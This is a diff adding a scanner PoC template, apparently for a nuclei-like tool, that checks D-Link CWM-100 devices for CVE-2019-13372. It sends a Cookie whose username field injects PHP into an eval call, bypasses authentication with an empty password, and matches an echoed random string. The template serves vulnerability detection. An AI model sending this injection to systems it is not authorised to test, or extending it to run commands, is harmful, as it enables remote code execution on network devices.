@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "通过发送特制Cookie触发eval注入，验证D-Link Central WiFi Manager CWM-100的远程代码执行漏洞。Cookie中username字段包含PHP代码注入payload，空密码绕过认证，若目标存在漏洞则响应体中包含注入代码的echo输出。"
+id = "POC-AVE-2019-0064"
+name = "D-Link Central WiFi Manager CWM-100 远程代码执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2019-0064"]
+vuln_id = [
+    "CVE-2019-13372",
+    "AVE-2019-0064",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/index.php/Index/index"
+protocol = "http"
+
+[poc.requests.headers]
+Cookie = """username=',0,"",1,"0")%3becho%20"{{rand_text_alpha(10)}}"%3b//";password="""
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "{{rand_text_alpha(10)}}",
+    "/public/css/",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
